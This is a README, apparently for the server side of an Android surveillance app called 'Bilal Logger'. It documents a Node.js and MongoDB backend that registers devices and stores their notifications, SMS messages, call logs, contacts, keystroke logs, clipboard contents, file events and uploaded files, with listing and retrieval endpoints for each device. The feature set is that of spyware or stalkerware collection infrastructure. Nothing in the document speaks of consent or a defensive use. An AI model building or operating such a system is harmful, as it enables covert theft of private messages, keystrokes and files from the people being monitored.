# Bilal Logger Backend Server

A comprehensive Node.js backend server for the Bilal Android logging application. This server handles device registration, data collection, and file storage with per-device organization.

## Features

- **Device Registration**: Automatic UUID assignment and device management
- **Per-Device Collections**: Separate MongoDB collections for each device
- **File Storage**: Organized file storage with timestamped filenames
- **Pagination Support**: All data endpoints support pagination
- **Real-time Logging**: Comprehensive logging for all operations
- **Health Monitoring**: Built-in health check endpoints

## Prerequisites

- Node.js 16.0.0 or higher
- MongoDB 4.4 or higher
- npm or yarn package manager

## Installation

1. **Clone the repository**
   ```bash
   cd script/new-notif-server
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Set up MongoDB**
   - Ensure MongoDB is running on `localhost:27017`
   - The database `bilal_logger` will be created automatically

4. **Start the server**
   ```bash
   npm start
   ```

   For development with auto-restart:
   ```bash
   npm run dev
   ```

## API Documentation

### Base URL
```
http://localhost:3000/api
```

### Device Registration

**POST** `/register`
Register a new device or update existing device information.

**Request Body:**
```json
{
  "deviceId": "unique_device_identifier",
  "deviceInfo": {
    "model": "Pixel 7",
    "manufacturer": "Google",
    "androidVersion": "13",
    "appVersion": "1.0.0"
  }
}
```

**Response:**
```json
{
  "success": true,
  "uuid": "generated-uuid",
  "deviceId": "unique_device_identifier"
}
```

### Data Upload Endpoints

All data upload endpoints follow the same pattern:

**POST** `/{dataType}`
Upload data for a specific device.

**Request Body:**
```json
{
  "deviceId": "unique_device_identifier",
  "data": [
    {
      "timestamp": 1699123456789,
      // ... data-specific fields
    }
  ]
}
```

**Available Data Types:**
- `notifications` - App notifications
- `sms` - SMS messages
- `callLogs` - Call history
- `contacts` - Contact information
- `keylogs` - Keyboard input logs
- `clipboard` - Clipboard content
- `fileEvents` - File system events

### Data Retrieval Endpoints

**GET** `/{dataType}/{deviceId}`
Retrieve data with pagination support.

**Query Parameters:**
- `page` (default: 1) - Page number
- `limit` (default: 50) - Items per page
- `uploaded` (optional) - Filter by upload status

**Example:**
```
GET /notifications/device123?page=1&limit=20&uploaded=true
```

**Response:**
```json
{
  "success": true,
  "data": [...],
  "pagination": {
    "page": 1,
    "limit": 20,
    "total": 150,
    "pages": 8
  }
}
```

### File Upload

**POST** `/files/{deviceId}`
Upload files with automatic organization.

**Form Data:**
- `file` - The file to upload
- `fileType` - Type of file (image, document, video, audio, archive)
- `originalName` - Original filename

**Response:**
```json
{
  "success": true,
  "filename": "1699123456789_document.pdf",
  "path": "device123/documents/1699123456789_document.pdf",
  "size": 1024000
}
```

### Device Management

**GET** `/devices`
List all registered devices.

**Response:**
```json
{
  "success": true,
  "devices": [
    {
      "deviceId": "device123",
      "uuid": "generated-uuid",
      "registrationDate": "2023-11-05T10:30:00.000Z",
      "lastSeen": "2023-11-05T15:45:00.000Z",
      "deviceInfo": {
        "model": "Pixel 7",
        "manufacturer": "Google",
        "androidVersion": "13",
        "appVersion": "1.0.0"
      }
    }
  ]
}
```

### Health Check

**GET** `/health`
Check server status and uptime.

**Response:**
```json
{
  "status": "healthy",
  "timestamp": "2023-11-05T15:45:00.000Z",
  "uptime": 12345.67
}
```

## File Storage Structure

Files are organized by device and type:

```
uploads/
├── device123/
│   ├── images/
│   │   ├── 1699123456789_photo1.jpg
│   │   └── 1699123456789_photo2.png
│   ├── documents/
│   │   ├── 1699123456789_document1.pdf
│   │   └── 1699123456789_document2.docx
│   ├── videos/
│   │   └── 1699123456789_video1.mp4
│   ├── audio/
│   │   └── 1699123456789_audio1.mp3
│   └── archives/
│       └── 1699123456789_archive1.zip
└── device456/
    └── ...
```

## MongoDB Collections

Each device gets its own set of collections:

- `{deviceId}_notifications`
- `{deviceId}_sms`
- `{deviceId}_callLogs`
- `{deviceId}_contacts`
- `{deviceId}_keylogs`
- `{deviceId}_clipboard`
- `{deviceId}_fileEvents`

## Environment Variables

Create a `.env` file for configuration:

```env
PORT=3000
MONGODB_URI=mongodb://localhost:27017/bilal_logger
NODE_ENV=production
```

## Security Considerations

- All file uploads are validated
- Device authentication is required for all operations
- File size limits are enforced
- CORS is configured for cross-origin requests

## Error Handling

All endpoints return consistent error responses:

```json
{
  "error": "Error description"
}
```

Common HTTP status codes:
- `200` - Success
- `400` - Bad Request
- `404` - Device/Resource not found
- `500` - Internal server error

## Development

### Running Tests
```bash
npm test
```

### Code Style
The project follows standard Node.js conventions and ESLint rules.

### Logging
All operations are logged to console with appropriate log levels.

## Deployment

### Production Setup
1. Set environment variables
2. Use PM2 or similar process manager
3. Configure reverse proxy (nginx)
4. Set up SSL certificates
5. Configure MongoDB authentication

### Docker Deployment
```bash
docker build -t bilal-logger-server .
docker run -p 3000:3000 bilal-logger-server
```

## Support

For issues and questions, please refer to the project documentation or create an issue in the repository.

## License

MIT License - see LICENSE file for details. 